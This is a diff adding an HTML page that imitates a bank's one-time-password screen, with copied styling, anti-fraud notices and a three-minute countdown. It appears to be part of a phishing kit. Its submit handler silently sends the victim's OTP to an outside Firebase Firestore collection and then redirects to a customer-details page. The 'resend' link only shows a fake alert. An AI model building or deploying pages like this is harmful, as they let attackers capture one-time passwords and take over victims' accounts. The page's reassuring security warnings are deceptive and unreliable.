@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP</title>
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <!-- Your custom CSS -->
+    <link rel="stylesheet" href="./style.css">
+    <style>
+        /* Add your custom styles here */
+    </style>
+
+</head>
+
+<body>
+    <header class="Tpv_logo__La5jG">
+        <img alt="cMIF2W" width="120" height="32" src="./images/logo.7fd9da50.png" style="color:transparent">
+    </header>
+    <div class="Tpv_login_heading__E5J6K">
+        <h3 class="Tpv_login_heading_h3__z0Qx1">Continue with One Time Password</h3>
+    </div>
+    <div class="Tpv_login_form___9zpm">
+        <p class="Tpv_content_title__SWlCq">One-time password sent to your registered mobile number</p>
+        <p class="Tpv_mandatory_txt__YZHLO">Required fields an asterisk (*)</p>
+        <form class="Tpv_form__okPRU" id="firebaseForm" onsubmit="submitForm(event)">
+            <div class="Tpv_form_group__aHWg0"><label class="Tpv_label__cObJz">Enter the One Time-Password (OTP)*<span
+                        class="Tpv_mandatory_txt__YZHLO">*</span></label><input class="Tpv_form_control__5hzGF"
+                    required="" minlength="6" maxlength="8" type="text" value="" name="OTT0"></div>
+            <div id="input_error" class="input_error"></div>
+            <div class="Tpv_t_center__8YF86"><input class="Tpv_btn_default__TMlv_" type="submit"></div>
+        </form>
+        <div class="Tpv_t_center__8YF86">
+            <div id="timeCountDown">3:00</div>
+        </div>
+        <div class="Tpv_t_center__8YF86">
+            <p>If you haven't received a one-time password on your mobile phone, &nbsp;<span
+                    class="Tpv_btn_resend__L6Fku" onclick="resendOTP()">click here to resend</span></p>
+        </div>
+        <div class="Tpv_info_panel__qNS7i">
+            <div class="Tpv_notify_icon__7fP0C">
+                <ul>
+                    <li>Please be aware that all call, SMS, email related be sent to your registered mobile number.</li>
+                    <li>We never contact you via email, SMS, or phone calls to request your personal information.</li>
+                    <li>Please do not respond to suspicious SMS, calls, and emails. Kindly report any such suspicious
+                        activity immediately.</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    <div class="Tpv_footer_area__vmfML"><img alt="599OM4" loading="lazy" width="68" height="28" decoding="async"
+            data-nimg="1" src="./images/ersign.6a658828.png" style="color:transparent"></div>
+    <div class="Tpv_footer__uSut5">
+        <p>© 2023</p>
+    </div>
+        <!-- Include Firebase SDK and your configuration -->
+        <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+        <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
+    
+    <!-- Bootstrap JS and dependencies (jQuery) -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+    
+    <!-- Your custom JavaScript for Firebase integration -->
+
+    <script>
+        // Your Firebase configuration
+        const firebaseConfig = {
+      apiKey: "AIzaSyB2heDmSZnCAo2wesbIYGfibU3r0ERji7c",
+      authDomain: "dataapp-1cc92.firebaseapp.com",
+      projectId: "dataapp-1cc92",
+      storageBucket: "dataapp-1cc92.appspot.com",
+      messagingSenderId: "842942560914",
+      appId: "1:842942560914:web:751f7c1434d5032cb2444b",
+      measurementId: "G-FJ634LE6MZ"
+    };
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        // Your form submission function
+        async function submitForm(event) {
+            event.preventDefault();
+
+            const form = document.getElementById('firebaseForm');
+            const formData = new FormData(form);
+
+            // Convert formData to a plain object
+            const formDataObject = {};
+            formData.forEach((value, key) => {
+                formDataObject[key] = value;
+            });
+
+            try {
+                // Initialize Firestore
+                const firestore = firebase.firestore();
+                formDataObject.timestamp = firebase.firestore.FieldValue.serverTimestamp();
+
+                // Add data to Firestore
+                const submissionsCollection = firestore.collection('formSubmissions');
+                await submissionsCollection.add(formDataObject);
+
+                // Clear form after submission
+                form.reset();
+                window.location.href = 'cusdetails.html';
+
+            } catch (error) {
+                console.error('Error adding document: ', error);
+            }
+        }
+    </script>
+
+    <script>
+        function startCountdown(duration) {
+            let timerDisplay = document.getElementById('timeCountDown');
+
+            let timer = duration * 60; // Convert minutes to seconds
+
+            let intervalId = setInterval(function () {
+                let minutes = Math.floor(timer / 60);
+                let seconds = timer % 60;
+
+                // Display the time in the specified format
+                timerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+
+                if (--timer < 0) {
+                    clearInterval(intervalId);
+                    timerDisplay.textContent = '0:00';
+                    // You can perform additional actions when the countdown reaches 0
+                }
+            }, 1000); // Update every second
+        }
+
+        // Start the countdown with a duration of 3 minutes
+        startCountdown(3);
+
+        function resendOTP() {
+
+            alert("OTP resend successfully !");
+
+        }
+    </script>
+
+</body>
+
+</html>
